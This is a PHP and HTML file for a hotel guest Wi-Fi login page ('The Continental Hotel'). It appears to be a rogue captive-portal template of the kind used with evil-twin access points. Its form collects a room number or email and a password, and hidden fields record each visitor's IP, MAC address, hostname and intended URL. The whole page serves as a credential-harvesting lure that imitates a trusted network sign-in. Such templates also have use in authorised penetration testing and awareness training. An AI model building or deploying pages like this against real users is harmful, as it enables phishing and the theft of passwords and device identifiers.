<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>The Continental Hotel - Guest Wi-Fi</title>

  <style>
    body {
      font-family: 'Georgia', serif;
      background: url('assets/img/background.png') no-repeat center center fixed;
      background-size: cover;
      color: #FFFFFF;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      backdrop-filter: brightness(50%) blur(3px);
    }

    .container {
      width: 100%;
      max-width: 400px;
      text-align: center;
    }

    .logo img {
      width: 100%;
      max-width: 220px;
      margin-bottom: 20px;
    }

    .form-container {
      background: rgba(0, 0, 0, 0.7);
      border-radius: 8px;
      padding: 20px;
      box-shadow: 0 0 15px rgba(0,0,0,0.5);
    }

    .input-field {
      width: 100%;
      padding: 12px;
      border: 1px solid #555;
      border-radius: 4px;
      margin-bottom: 10px;
      font-size: 15px;
      background-color: #FFFFFF;
      color: #000;
      box-sizing: border-box;
    }

    .submit-btn {
      background: #8B0000;
      border: none;
      color: #FFFFFF;
      padding: 12px;
      border-radius: 20px;
      cursor: pointer;
      font-size: 17px;
      font-weight: bold;
      width: 100%;
      margin-top: 5px;
    }

    .submit-btn:hover {
      background: #600000;
    }

    .links {
      font-size: 12px;
      margin-top: 10px;
    }

    .links a {
      color: #FFD700;
      text-decoration: none;
    }

    footer {
      font-size: 11px;
      color: #ccc;
      margin-top: 15px;
    }

    footer a {
      color: #ccc;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="assets/img/logo.png" alt="The Continental Hotel Logo">
    </div>
    <div class="form-container">
      <form method="POST" action="/captiveportal/index.php" id="login-form">
        <input name="email" class="input-field" type="text" placeholder="Room Number or Guest Email" required>
        <input name="password" class="input-field" type="password" placeholder="Last Name or Password" required>

        <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
        <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
        <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
        <input type="hidden" name="target" value="<?=$destination?>">

        <button class="submit-btn" type="submit">Connect to Wi-Fi</button>
      </form>
      <div class="links">
        <a href="reset.php">Forgot Room Number or Password?</a><br>
        New Guest? <a href="create.php">Register Your Stay</a>
      </div>
    </div>

    <footer>
      The Continental Hotel © 2025. All rights reserved.
      <a href="privacy.php">Privacy policy</a>
    </footer>
  </div>
</body>
</html>
